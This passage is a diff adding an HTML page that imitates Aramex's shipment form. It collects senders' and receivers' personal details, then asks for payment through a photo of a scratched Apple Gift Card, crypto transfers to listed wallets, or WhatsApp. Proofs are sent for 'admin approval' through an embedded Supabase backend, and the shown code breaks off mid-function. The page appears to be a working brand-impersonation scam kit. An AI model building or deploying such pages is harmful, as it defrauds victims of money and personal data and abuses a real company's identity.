@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Send Shipment - Aramex</title>
+  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.1/dist/umd/supabase.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Red Hat Display', system-ui, -apple-system, sans-serif;
+      background: #fff;
+      color: #111;
+    }
+    .page {
+      max-width: 420px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background: #fff;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px;
+      border-bottom: 1px solid #f3f4f6;
+      position: sticky;
+      top: 0;
+      background: #fff;
+      z-index: 50;
+    }
+    .logo div { font-weight: 700; color: #DC291E; font-size: 18px; }
+    .logo p { font-size: 9px; color: #6b7280; margin-top: -2px; }
+    .header-btns a {
+      background: #DC291E;
+      color: #fff;
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 500;
+      padding: 6px 14px;
+      border-radius: 9999px;
+      margin-left: 6px;
+    }
+    .progress {
+      display: flex;
+      justify-content: space-between;
+      padding: 28px 20px 10px;
+      position: relative;
+    }
+    .progress::before {
+      content: '';
+      position: absolute;
+      top: 42px;
+      left: 40px;
+      right: 40px;
+      height: 2px;
+      background: #e5e7eb;
+      z-index: 0;
+    }
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 1;
+      flex: 1;
+    }
+    .step .circle {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #e5e7eb;
+      color: #9ca3af;
+      font-size: 13px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 8px;
+    }
+    .step.active .circle {
+      background: #DC291E;
+      color: #fff;
+    }
+    .step .label {
+      font-size: 12px;
+      color: #9ca3af;
+      text-align: center;
+      line-height: 1.2;
+    }
+    .step.active .label {
+      color: #DC291E;
+      font-weight: 500;
+    }
+    .form-area { padding: 20px 20px 40px; }
+    .form-title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 28px;
+    }
+    .field { margin-bottom: 24px; }
+    .field label {
+      display: block;
+      font-size: 14px;
+      color: #374151;
+      margin-bottom: 6px;
+    }
+    .field label .req { color: #DC291E; }
+    .field input, .field select {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #d1d5db;
+      padding: 10px 0;
+      font-size: 16px;
+      outline: none;
+      background: transparent;
+      font-family: inherit;
+    }
+    .field input:focus, .field select:focus {
+      border-bottom-color: #DC291E;
+    }
+    .phone-row {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #d1d5db;
+      padding-bottom: 8px;
+    }
+    .phone-row:focus-within { border-bottom-color: #DC291E; }
+    .flag-code {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding-right: 10px;
+      font-size: 15px;
+      white-space: nowrap;
+    }
+    .flag-code select {
+      border: none;
+      background: transparent;
+      font-size: 15px;
+      outline: none;
+      font-family: inherit;
+    }
+    .phone-row input {
+      flex: 1;
+      border: none;
+      padding: 8px 0;
+      font-size: 16px;
+      outline: none;
+      background: transparent;
+    }
+    .landmark-wrap { position: relative; }
+    .landmark-wrap .warn {
+      position: absolute;
+      right: 0;
+      top: 32px;
+      color: #DC291E;
+      font-size: 16px;
+    }
+    .btn-continue {
+      display: block;
+      width: 100%;
+      background: #DC291E;
+      color: #fff;
+      border: none;
+      padding: 16px;
+      border-radius: 9999px;
+      font-size: 16px;
+      font-weight: 600;
+      margin-top: 20px;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .btn-continue:disabled { opacity: 0.6; cursor: default; }
+    .step-content { display: none; }
+    .step-content.active { display: block; }
+    .pay-option {
+      border: 1px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+    }
+    .pay-option.selected {
+      border-color: #DC291E;
+      background: #fef2f2;
+      box-shadow: 0 0 0 1px #DC291E;
+    }
+    .pay-option strong { font-size: 15px; }
+    .pay-option:hover { border-color: #f87171; }
+    .pay-option input { accent-color: #DC291E; }
+    .summary-box {
+      background: #f9fafb;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 24px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    .success-box {
+      text-align: center;
+      padding: 40px 20px;
+    }
+    .success-box .icon {
+      font-size: 64px;
+      color: #16a34a;
+      margin-bottom: 16px;
+    }
+    .success-box h2 {
+      font-size: 24px;
+      margin-bottom: 12px;
+    }
+    .tracking-number {
+      background: #fef2f2;
+      color: #DC291E;
+      font-size: 22px;
+      font-weight: 700;
+      padding: 16px;
+      border-radius: 12px;
+      margin: 24px 0;
+      letter-spacing: 1px;
+      word-break: break-all;
+    }
+    .success-box p {
+      font-size: 15px;
+      color: #4b5563;
+      margin-bottom: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+
+    <header>
+      <div class="logo">
+        <div>aramex</div>
+        <p>delivery unlimited</p>
+      </div>
+      <div class="header-btns">
+        <a href="login.html">Log in</a>
+        <a href="select-service.html">Create an account</a>
+      </div>
+    </header>
+
+    <div class="progress" id="progressBar">
+      <div class="step active" id="prog1">
+        <div class="circle">1</div>
+        <div class="label">Shipper<br>details</div>
+      </div>
+      <div class="step" id="prog2">
+        <div class="circle">2</div>
+        <div class="label">Receiver<br>details</div>
+      </div>
+      <div class="step" id="prog3">
+        <div class="circle">3</div>
+        <div class="label">Shipment<br>details</div>
+      </div>
+      <div class="step" id="prog4">
+        <div class="circle">4</div>
+        <div class="label">Payment<br>options</div>
+      </div>
+    </div>
+
+    <!-- STEP 1 -->
+    <div class="form-area step-content active" id="step1">
+      <h2 class="form-title">Please fill in the shipper details</h2>
+      <div class="field">
+        <label>Name <span class="req">*</span></label>
+        <input type="text" id="shipperName">
+      </div>
+      <div class="field">
+        <label>Email Address <span class="req">*</span></label>
+        <input type="email" id="shipperEmail">
+      </div>
+      <div class="field">
+        <label>Country <span class="req">*</span></label>
+        <select id="shipperCountry"></select>
+      </div>
+      <div class="field">
+        <label>Phone number <span class="req">*</span></label>
+        <div class="phone-row">
+          <div class="flag-code">
+            <select id="shipperCode"></select>
+          </div>
+          <input type="tel" id="shipperPhone" placeholder="050 123 4567">
+        </div>
+      </div>
+      <div class="field">
+        <label>City <span class="req">*</span></label>
+        <input type="text" id="shipperCity" placeholder="e.g. Dubai">
+      </div>
+      <div class="field">
+        <label>Street name <span class="req">*</span></label>
+        <input type="text" id="shipperStreet">
+      </div>
+      <div class="field">
+        <label>Building Name/Number <span class="req">*</span></label>
+        <input type="text" id="shipperBuilding">
+      </div>
+      <div class="field landmark-wrap">
+        <label>Nearest Landmark or W3W address</label>
+        <input type="text" id="shipperLandmark">
+        <span class="warn">!</span>
+      </div>
+      <button class="btn-continue" onclick="goToStep(2)">Continue</button>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="form-area step-content" id="step2">
+      <h2 class="form-title">Please fill in the receiver details</h2>
+      <div class="field">
+        <label>Name <span class="req">*</span></label>
+        <input type="text" id="receiverName">
+      </div>
+      <div class="field">
+        <label>Email Address</label>
+        <input type="email" id="receiverEmail">
+      </div>
+      <div class="field">
+        <label>Country <span class="req">*</span></label>
+        <select id="receiverCountry"></select>
+      </div>
+      <div class="field">
+        <label>Phone number <span class="req">*</span></label>
+        <div class="phone-row">
+          <div class="flag-code">
+            <select id="receiverCode"></select>
+          </div>
+          <input type="tel" id="receiverPhone" placeholder="05X XXX XXXX">
+        </div>
+      </div>
+      <div class="field">
+        <label>City <span class="req">*</span></label>
+        <input type="text" id="receiverCity" placeholder="e.g. Riyadh">
+      </div>
+      <div class="field">
+        <label>Street name <span class="req">*</span></label>
+        <input type="text" id="receiverStreet">
+      </div>
+      <div class="field">
+        <label>Building Name/Number <span class="req">*</span></label>
+        <input type="text" id="receiverBuilding">
+      </div>
+      <div class="field landmark-wrap">
+        <label>Nearest Landmark or W3W address</label>
+        <input type="text" id="receiverLandmark">
+        <span class="warn">!</span>
+      </div>
+      <button class="btn-continue" onclick="goToStep(3)">Continue</button>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="form-area step-content" id="step3">
+      <h2 class="form-title">Shipment details</h2>
+      <div class="field">
+        <label>Shipment type <span class="req">*</span></label>
+        <select id="shipType">
+          <option value="">Select type</option>
+          <option value="document">Document</option>
+          <option value="parcel">Parcel / Non-document</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Description of contents <span class="req">*</span></label>
+        <input type="text" id="shipDesc">
+      </div>
+      <div class="field">
+        <label>Number of pieces <span class="req">*</span></label>
+        <input type="number" id="shipPieces" min="1" value="1">
+      </div>
+      <div class="field">
+        <label>Weight (kg) <span class="req">*</span></label>
+        <input type="number" id="shipWeight" step="0.1" min="0.1">
+      </div>
+      <div class="field">
+        <label>Length (cm)</label>
+        <input type="number" id="shipLength">
+      </div>
+      <div class="field">
+        <label>Width (cm)</label>
+        <input type="number" id="shipWidth">
+      </div>
+      <div class="field">
+        <label>Height (cm)</label>
+        <input type="number" id="shipHeight">
+      </div>
+      <div class="field">
+        <label>Service type <span class="req">*</span></label>
+        <select id="serviceType">
+          <option value="domestic">Domestic Express</option>
+          <option value="international">International Express</option>
+        </select>
+      </div>
+      <button class="btn-continue" onclick="goToStep(4)">Continue</button>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="form-area step-content" id="step4">
+      <h2 class="form-title">Payment options</h2>
+      <div class="summary-box" id="summaryBox"></div>
+
+      <div class="pay-option" onclick="selectPay(this, 'gift')">
+        <input type="radio" name="payment" value="gift">
+        <div>
+          <strong>Apple Gift Card</strong><br>
+          <span style="font-size:13px;color:#6b7280;">Upload scratched Apple Gift Card as proof</span>
+        </div>
+      </div>
+
+      <div class="pay-option" onclick="selectPay(this, 'wallet')">
+        <input type="radio" name="payment" value="wallet">
+        <div>
+          <strong>Crypto Wallet</strong><br>
+          <span style="font-size:13px;color:#6b7280;">Pay to one of our wallet addresses</span>
+        </div>
+      </div>
+
+      <div class="pay-option" onclick="selectPay(this, 'chat')">
+        <input type="radio" name="payment" value="chat">
+        <div>
+          <strong>Visit Chat</strong><br>
+          <span style="font-size:13px;color:#6b7280;">Discuss payment options on WhatsApp</span>
+        </div>
+      </div>
+
+      <div id="giftSection" style="display:none; margin-top:20px;">
+        <p style="font-size:14px; margin-bottom:12px; color:#374151;">
+          Please upload a clear photo of the <strong>scratched Apple Gift Card</strong> (code must be visible).
+        </p>
+        <input type="file" id="giftImage" accept="image/*">
+        <div id="giftPreview" style="margin-top:10px;"></div>
+      </div>
+
+      <div id="walletSection" style="display:none; margin-top:20px;">
+        <p style="font-size:14px; margin-bottom:12px; color:#374151;">
+          Copy one of the wallet addresses below and send the payment. Then upload a screenshot of the transaction.
+        </p>
+        <div style="background:#f9fafb; border-radius:10px; padding:14px; margin-bottom:12px; font-size:13px;">
+          <div style="margin-bottom:10px;">
+            <strong>Bitcoin (BTC)</strong><br>
+            <span id="btcAddr" style="word-break:break-all;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
+            <button type="button" onclick="copyText('btcAddr')" style="margin-left:8px; font-size:12px; padding:2px 8px;">Copy</button>
+          </div>
+          <div style="margin-bottom:10px;">
+            <strong>USDT (TRC20)</strong><br>
+            <span id="usdtAddr" style="word-break:break-all;">TXYZabcdefghijklmnopqrstuvwxyz123456</span>
+            <button type="button" onclick="copyText('usdtAddr')" style="margin-left:8px; font-size:12px; padding:2px 8px;">Copy</button>
+          </div>
+          <div>
+            <strong>Ethereum (ETH)</strong><br>
+            <span id="ethAddr" style="word-break:break-all;">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</span>
+            <button type="button" onclick="copyText('ethAddr')" style="margin-left:8px; font-size:12px; padding:2px 8px;">Copy</button>
+          </div>
+        </div>
+        <p style="font-size:14px; margin-bottom:8px;">Upload payment screenshot:</p>
+        <input type="file" id="walletImage" accept="image/*">
+        <div id="walletPreview" style="margin-top:10px;"></div>
+      </div>
+
+      <button class="btn-continue" id="confirmBtn" onclick="submitShipment()" style="display:none;">
+        Submit payment for approval
+      </button>
+    </div>
+
+    <!-- STATUS: shown after submitting. Success only appears once the admin approves. -->
+    <div class="form-area step-content" id="stepSuccess">
+
+      <!-- Waiting for admin -->
+      <div class="success-box" id="statusPending">
+        <div class="icon" style="color:#d97706;">⏳</div>
+        <h2>Awaiting payment approval</h2>
+        <p>Your request ID is:</p>
+        <div class="tracking-number" id="requestIdText" style="background:#fffbeb;color:#b45309;"></div>
+        <p>Your payment proof has been sent to our team for review. Your shipment is <strong>not confirmed</strong> until the payment is approved.</p>
+        <p style="margin-top:12px; font-size:14px;">Keep this request ID. Once approved, your tracking number will appear here and on the Track page.</p>
+        <p id="statusNote" style="margin-top:10px; font-size:13px; color:#6b7280;"></p>
+        <button class="btn-continue" style="margin-top:24px;" onclick="goToStatusPage()">Check status</button>
+        <button class="btn-continue" style="margin-top:12px; background:#111;" onclick="location.href='index.html'">Back to Home</button>
+      </div>
+
+      <!-- Approved by admin -->
+      <div class="success-box" id="statusApproved" style="display:none;">
+        <div class="icon">✓</div>
+        <h2>Payment confirmed!</h2>
+        <p>Your payment was approved and your shipment has been created. Your tracking number is:</p>
+        <div class="tracking-number" id="finalTracking"></div>
+        <p style="margin-top:20px; font-size:14px;">You can track it anytime from the Track page.</p>
+        <button class="btn-continue" style="margin-top:30px;" onclick="location.href='index.html'">Back to Home</button>
+        <button class="btn-continue" style="margin-top:12px; background:#111;" id="trackNowBtn">Track Now</button>
+      </div>
+
+      <!-- Rejected by admin -->
+      <div class="success-box" id="statusRejected" style="display:none;">
+        <div class="icon" style="color:#DC291E;">✕</div>
+        <h2>Payment proof rejected</h2>
+        <p>We could not verify the payment proof for request:</p>
+        <div class="tracking-number" id="rejectedIdText"></div>
+        <p>Please check the details and submit a clear, valid proof again.</p>
+        <button class="btn-continue" style="margin-top:24px;" onclick="retryAfterRejection()">Try again</button>
+        <button class="btn-continue" style="margin-top:12px; background:#111;" onclick="location.href='index.html'">Back to Home</button>
+      </div>
+
+    </div>
+
+  </div>
+
+  <script>
+
+var SUPABASE_URL = 'https://taivppkwclmkarhqmnuw.supabase.co';
+var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRhaXZwcGt3Y2xta2FyaHFtbnV3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAwMDUwMTQsImV4cCI6MjEwNTU4MTAxNH0.jDf89ZbDVMVdoVV6nBbJJNYkMrghghpAVuhwZgxWsOM';
+var supabaseClient = null;
+if (window.supabase && window.supabase.createClient) {
+  supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+}
+
+window.ARAMEX_COUNTRIES = [
+  {name:"Afghanistan",code:"+93",flag:"🇦🇫"},
+  {name:"Albania",code:"+355",flag:"🇦🇱"},
+  {name:"Algeria",code:"+213",flag:"🇩🇿"},
+  {name:"Andorra",code:"+376",flag:"🇦🇩"},
+  {name:"Angola",code:"+244",flag:"🇦🇴"},
+  {name:"Argentina",code:"+54",flag:"🇦🇷"},
+  {name:"Armenia",code:"+374",flag:"🇦🇲"},
+  {name:"Australia",code:"+61",flag:"🇦🇺"},
+  {name:"Austria",code:"+43",flag:"🇦🇹"},
+  {name:"Azerbaijan",code:"+994",flag:"🇦🇿"},
+  {name:"Bahrain",code:"+973",flag:"🇧🇭"},
+  {name:"Bangladesh",code:"+880",flag:"🇧🇩"},
+  {name:"Belarus",code:"+375",flag:"🇧🇾"},
+  {name:"Belgium",code:"+32",flag:"🇧🇪"},
+  {name:"Benin",code:"+229",flag:"🇧🇯"},
+  {name:"Bhutan",code:"+975",flag:"🇧🇹"},
+  {name:"Bolivia",code:"+591",flag:"🇧🇴"},
+  {name:"Bosnia and Herzegovina",code:"+387",flag:"🇧🇦"},
+  {name:"Botswana",code:"+267",flag:"🇧🇼"},
+  {name:"Brazil",code:"+55",flag:"🇧🇷"},
+  {name:"Brunei",code:"+673",flag:"🇧🇳"},
+  {name:"Bulgaria",code:"+359",flag:"🇧🇬"},
+  {name:"Burkina Faso",code:"+226",flag:"🇧🇫"},
+  {name:"Cambodia",code:"+855",flag:"🇰🇭"},
+  {name:"Cameroon",code:"+237",flag:"🇨🇲"},
+  {name:"Canada",code:"+1",flag:"🇨🇦"},
+  {name:"Chile",code:"+56",flag:"🇨🇱"},
+  {name:"China",code:"+86",flag:"🇨🇳"},
+  {name:"Colombia",code:"+57",flag:"🇨🇴"},
+  {name:"Congo",code:"+242",flag:"🇨🇬"},
+  {name:"Costa Rica",code:"+506",flag:"🇨🇷"},
+  {name:"Croatia",code:"+385",flag:"🇭🇷"},
+  {name:"Cyprus",code:"+357",flag:"🇨🇾"},
+  {name:"Czech Republic",code:"+420",flag:"🇨🇿"},
+  {name:"Denmark",code:"+45",flag:"🇩🇰"},
+  {name:"Egypt",code:"+20",flag:"🇪🇬"},
+  {name:"Estonia",code:"+372",flag:"🇪🇪"},
+  {name:"Ethiopia",code:"+251",flag:"🇪🇹"},
+  {name:"Finland",code:"+358",flag:"🇫🇮"},
+  {name:"France",code:"+33",flag:"🇫🇷"},
+  {name:"Georgia",code:"+995",flag:"🇬🇪"},
+  {name:"Germany",code:"+49",flag:"🇩🇪"},
+  {name:"Ghana",code:"+233",flag:"🇬🇭"},
+  {name:"Greece",code:"+30",flag:"🇬🇷"},
+  {name:"Hong Kong",code:"+852",flag:"🇭🇰"},
+  {name:"Hungary",code:"+36",flag:"🇭🇺"},
+  {name:"Iceland",code:"+354",flag:"🇮🇸"},
+  {name:"India",code:"+91",flag:"🇮🇳"},
+  {name:"Indonesia",code:"+62",flag:"🇮🇩"},
+  {name:"Iran",code:"+98",flag:"🇮🇷"},
+  {name:"Iraq",code:"+964",flag:"🇮🇶"},
+  {name:"Ireland",code:"+353",flag:"🇮🇪"},
+  {name:"Israel",code:"+972",flag:"🇮🇱"},
+  {name:"Italy",code:"+39",flag:"🇮🇹"},
+  {name:"Japan",code:"+81",flag:"🇯🇵"},
+  {name:"Jordan",code:"+962",flag:"🇯🇴"},
+  {name:"Kazakhstan",code:"+7",flag:"🇰🇿"},
+  {name:"Kenya",code:"+254",flag:"🇰🇪"},
+  {name:"Kuwait",code:"+965",flag:"🇰🇼"},
+  {name:"Lebanon",code:"+961",flag:"🇱🇧"},
+  {name:"Libya",code:"+218",flag:"🇱🇾"},
+  {name:"Luxembourg",code:"+352",flag:"🇱🇺"},
+  {name:"Malaysia",code:"+60",flag:"🇲🇾"},
+  {name:"Maldives",code:"+960",flag:"🇲🇻"},
+  {name:"Malta",code:"+356",flag:"🇲🇹"},
+  {name:"Mexico",code:"+52",flag:"🇲🇽"},
+  {name:"Morocco",code:"+212",flag:"🇲🇦"},
+  {name:"Nepal",code:"+977",flag:"🇳🇵"},
+  {name:"Netherlands",code:"+31",flag:"🇳🇱"},
+  {name:"New Zealand",code:"+64",flag:"🇳🇿"},
+  {name:"Nigeria",code:"+234",flag:"🇳🇬"},
+  {name:"Norway",code:"+47",flag:"🇳🇴"},
+  {name:"Oman",code:"+968",flag:"🇴🇲"},
+  {name:"Pakistan",code:"+92",flag:"🇵🇰"},
+  {name:"Palestine",code:"+970",flag:"🇵🇸"},
+  {name:"Philippines",code:"+63",flag:"🇵🇭"},
+  {name:"Poland",code:"+48",flag:"🇵🇱"},
+  {name:"Portugal",code:"+351",flag:"🇵🇹"},
+  {name:"Qatar",code:"+974",flag:"🇶🇦"},
+  {name:"Romania",code:"+40",flag:"🇷🇴"},
+  {name:"Russia",code:"+7",flag:"🇷🇺"},
+  {name:"Saudi Arabia",code:"+966",flag:"🇸🇦"},
+  {name:"Senegal",code:"+221",flag:"🇸🇳"},
+  {name:"Serbia",code:"+381",flag:"🇷🇸"},
+  {name:"Singapore",code:"+65",flag:"🇸🇬"},
+  {name:"South Africa",code:"+27",flag:"🇿🇦"},
+  {name:"South Korea",code:"+82",flag:"🇰🇷"},
+  {name:"Spain",code:"+34",flag:"🇪🇸"},
+  {name:"Sri Lanka",code:"+94",flag:"🇱🇰"},
+  {name:"Sudan",code:"+249",flag:"🇸🇩"},
+  {name:"Sweden",code:"+46",flag:"🇸🇪"},
+  {name:"Switzerland",code:"+41",flag:"🇨🇭"},
+  {name:"Syria",code:"+963",flag:"🇸🇾"},
+  {name:"Taiwan",code:"+886",flag:"🇹🇼"},
+  {name:"Tanzania",code:"+255",flag:"🇹🇿"},
+  {name:"Thailand",code:"+66",flag:"🇹🇭"},
+  {name:"Tunisia",code:"+216",flag:"🇹🇳"},
+  {name:"Turkey",code:"+90",flag:"🇹🇷"},
+  {name:"Uganda",code:"+256",flag:"🇺🇬"},
+  {name:"Ukraine",code:"+380",flag:"🇺🇦"},
+  {name:"United Arab Emirates",code:"+971",flag:"🇦🇪"},
+  {name:"United Kingdom",code:"+44",flag:"🇬🇧"},
+  {name:"United States",code:"+1",flag:"🇺🇸"},
+  {name:"Uzbekistan",code:"+998",flag:"🇺🇿"},
+  {name:"Venezuela",code:"+58",flag:"🇻🇪"},
+  {name:"Vietnam",code:"+84",flag:"🇻🇳"},
+  {name:"Yemen",code:"+967",flag:"🇾🇪"},
+  {name:"Zambia",code:"+260",flag:"🇿🇲"},
+  {name:"Zimbabwe",code:"+263",flag:"🇿🇼"}
+];
+
+window.ARAMEX_COUNTRY_NAMES = window.ARAMEX_COUNTRIES.map(function(c){ return c.name; }).sort();
+
+window.ARAMEX_OFFICES = [
+  {city:"Dubai", country:"United Arab Emirates", address:"Sheikh Zayed Road, Al Quoz Industrial Area"},
+  {city:"Abu Dhabi", country:"United Arab Emirates", address:"Mussafah Industrial Area"},
+  {city:"Sharjah", country:"United Arab Emirates", address:"Industrial Area 6"},
+  {city:"Riyadh", country:"Saudi Arabia", address:"Olaya Street, Al Olaya District"},
+  {city:"Jeddah", country:"Saudi Arabia", address:"Prince Sultan Road"},
+  {city:"Dammam", country:"Saudi Arabia", address:"King Fahd Road"},
+  {city:"Amman", country:"Jordan", address:"Mecca Street, Al Rabieh"},
+  {city:"Cairo", country:"Egypt", address:"Nasr City, Cairo"},
+  {city:"Alexandria", country:"Egypt", address:"Smouha"},
+  {city:"Kuwait City", country:"Kuwait", address:"Shuwaikh Industrial Area"},
+  {city:"Manama", country:"Bahrain", address:"Seef District"},
+  {city:"Doha", country:"Qatar", address:"Industrial Area"},
+  {city:"Muscat", country:"Oman", address:"Al Ghubrah"},
+  {city:"Beirut", country:"Lebanon", address:"Hamra Street"},
+  {city:"Istanbul", country:"Turkey", address:"Ataşehir"},
+  {city:"London", country:"United Kingdom", address:"Heathrow Cargo Centre"},
+  {city:"Frankfurt", country:"Germany", address:"Frankfurt Airport Cargo City"},
+  {city:"Paris", country:"France", address:"Roissy Charles de Gaulle"},
+  {city:"New York", country:"United States", address:"JFK International Airport"},
+  {city:"Los Angeles", country:"United States", address:"LAX Cargo"},
+  {city:"Toronto", country:"Canada", address:"Pearson Airport"},
+  {city:"Mumbai", country:"India", address:"Andheri East"},
+  {city:"Delhi", country:"India", address:"Indira Gandhi International Airport"},
+  {city:"Singapore", country:"Singapore", address:"Changi Airfreight Centre"},
+  {city:"Hong Kong", country:"Hong Kong", address:"Chek Lap Kok"},
+  {city:"Shanghai", country:"China", address:"Pudong International Airport"},
+  {city:"Beijing", country:"China", address:"Capital International Airport"},
+  {city:"Sydney", country:"Australia", address:"Sydney Airport"},
+  {city:"Johannesburg", country:"South Africa", address:"OR Tambo International"},
+  {city:"Nairobi", country:"Kenya", address:"Jomo Kenyatta International"},
+  {city:"Lagos", country:"Nigeria", address:"Ikeja"},
+  {city:"Casablanca", country:"Morocco", address:"Mohammed V Airport"}
+];
+
+var watchedRequestId = null;
+var lastRequestId = null;
+var statusTimer = null;
+
+function goToStep(step) {
+  if (step === 2) {
+    if (!document.getElementById('shipperName').value.trim() ||
+        !document.getElementById('shipperPhone').value.trim() ||
+        !document.getElementById('shipperCity').value.trim()) {
+      alert('Please fill the required shipper fields');
+      return;
+    }
+  }
+  if (step === 3) {
+    if (!document.getElementById('receiverName').value.trim() ||
+        !document.getElementById('receiverPhone').value.trim() ||
+        !document.getElementById('receiverCity').value.trim()) {
+      alert('Please fill the required receiver fields');
+      return;
+    }
+  }
+  if (step === 4) {
+    if (!document.getElementById('shipType').value ||
+        !document.getElementById('shipDesc').value.trim() ||
+        !document.getElementById('shipWeight').value) {
+      alert('Please fill the required shipment fields');
+      return;
+    }
+    document.getElementById('summaryBox').innerHTML =
+      '<strong>From:</strong> ' + document.getElementById('shipperName').value + ', ' + document.getElementById('shipperCity').value + '<br>' +
+      '<strong>To:</strong> ' + document.getElementById('receiverName').value + ', ' + document.getElementById('receiverCity').value + '<br>' +
+      '<strong>Type:</strong> ' + document.getElementById('shipType').value + ' – ' + document.getElementById('shipDesc').value + '<br>' +
+      '<strong>Weight:</strong> ' + document.getElementById('shipWeight').value + ' kg';
+  }
+
+  document.querySelectorAll('.step-content').forEach(function(el) {
+    el.classList.remove('active');
+  });
+  document.querySelectorAll('.step').forEach(function(el) {
+    el.classList.remove('active');
+  });
+
+  if (step === 'success') {
+    document.getElementById('stepSuccess').classList.add('active');
+    document.getElementById('progressBar').style.display = 'none';
+  } else {
+    document.getElementById('progressBar').style.display = 'flex';
+    document.getElementById('step' + step).classList.add('active');
+    document.getElementById('prog' + step).classList.add('active');
+  }
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function selectPay(el, type) {
+  document.querySelectorAll('.pay-option').forEach(function(o) {
+    o.classList.remove('selected');
+  });
+  el.classList.add('selected');
+  el.querySelector('input').checked = true;
+
+  document.getElementById('giftSection').style.display = 'none';
+  document.getElementById('walletSection').style.display = 'none';
+  document.getElementById('confirmBtn').style.display = 'none';
+
+  if (type === 'gift') {
+    document.getElementById('giftSection').style.display = 'block';
+    document.getElementById('confirmBtn').style.display = 'block';
+  } else if (type === 'wallet') {
+    document.getElementById('walletSection').style.display = 'block';
+    document.getElementById('confirmBtn').style.display = 'block';
+  } else if (type === 'chat') {
+    window.open('https://wa.me/971800272639?text=Hello%2C%20I%20want%20to%20discuss%20payment%20for%20my%20shipment', '_blank');
+  }
+}
+
+function copyText(id) {
+  var text = document.getElementById(id).innerText;
+  function fallback() {
+    try {
+      var ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.opacity = '0';
+      document.body.appendChild(ta);
+      ta.select();
+      var ok = document.execCommand('copy');
+      document.body.removeChild(ta);
+      if (ok) { alert('Address copied!'); return; }
+    } catch (e) {}
+    alert('Copy this address: ' + text);
+  }
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(function() {
+      alert('Address copied!');
+    }, fallback);
+  } else {
+    fallback();
+  }
+}
+
+function fillWorldSelects() {
+  var countries = window.ARAMEX_COUNTRIES || [];
+  var names = window.ARAMEX_COUNTRY_NAMES || countries.map(function(c){ return c.name; });
+  var sc = document.getElementById('shipperCountry');
+  var rc = document.getElementById('receiverCountry');
+  var sCode = document.getElementById('shipperCode');
+  var rCode = document.getElementById('receiverCode');
+  if (sc && names.length) {
+    sc.innerHTML = names.map(function(n) {
+      var sel = n === 'United Arab Emirates' ? ' selected' : '';
+      return '<option value="'+n+'"'+sel+'>'+n+'</option>';
+    }).join('');
+  }
+  if (rc && names.length) {
+    rc.innerHTML = names.map(function(n) {
+      var sel = n === 'Saudi Arabia' ? ' selected' : '';
+      return '<option value="'+n+'"'+sel+'>'+n+'</option>';
+    }).join('');
+  }
+  if (sCode && countries.length) {
+    sCode.innerHTML = countries.map(function(c) {
+      var sel = c.code === '+971' ? ' selected' : '';
+      return '<option value="'+c.code+'"'+sel+'>'+c.flag+' '+c.code+'</option>';
+    }).join('');
+  }
+  if (rCode && countries.length) {
+    rCode.innerHTML = countries.map(function(c) {
+      var sel = c.code === '+966' ? ' selected' : '';
+      return '<option value="'+c.code+'"'+sel+'>'+c.flag+' '+c.code+'</option>';
+    }).join('');
+  }
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  fillWorldSelects();
+  var giftInput = document.getElementById('giftImage');
+  var walletInput = document.getElementById('walletImage');
+  if (giftInput) {
+    giftInput.addEventListener('change', function(e) {
+      var file = e.target.files[0];
+      if (!file) return;
+      var reader = new FileReader();
+      reader.onload = function(ev) {
+        document.getElementById('giftPreview').innerHTML =
+          '<img src="' + ev.target.result + '" style="max-width:100%;border-radius:8px;margin-top:8px;">';
+      };
+      reader.readAsDataURL(file);
+    });
+  }
+  if (walletInput) {
+    walletInput.addEventListener('change', function(e) {
+      var file = e.target.files[0];
+      if (!file) return;
+      var reader = new FileReader();
+      reader.onload = function(ev) {
+        document.getElementById('walletPreview').innerHTML =
+          '<img src="' + ev.target.result + '" style="max-width:100%;border-radius:8px;margin-top:8px;">';
+      };
+      reader.readAsDataURL(file);
+    });
+  }
+});
+
+function generateRequestId() {
+  return 'REQ' + Date.now().toString(36).toUpperCase() + Math.floor(Math.random() * 1000);
+}
+
+function compressImage(file, cb) {
+  var reader = new FileReader();
+  reader.onload = function(ev) {
+    var img = new Image();
+    img.onload = function() {
+      var max = 900, w = img.width, h = img.height;
+      if (w > max || h > max) {
